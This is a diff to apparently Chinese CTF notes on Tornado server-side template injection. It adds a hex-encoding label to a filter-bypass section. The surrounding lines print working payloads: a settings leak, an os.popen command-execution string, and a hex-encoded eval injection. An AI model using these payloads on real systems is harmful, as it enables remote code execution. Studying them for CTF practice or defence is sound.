@@ -42,7 +42,7 @@ buuoj.cn:81/error?msg={{handler.settings}}
 然后看下请求方法，如果是get的话就可以传?GET=__import__("os").popen("ls").read()，post同理
 
 
-2、过滤了括号未过滤引号
+2、过滤了括号未过滤引号，16进制编码
 {% raw "\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x27\x29\x2e\x72\x65\x61\x64\x28\x29"%0a    _tt_utf8 = eval%}{{'1'%0a    _tt_utf8 = str}}
 
 3、过滤括号及引号
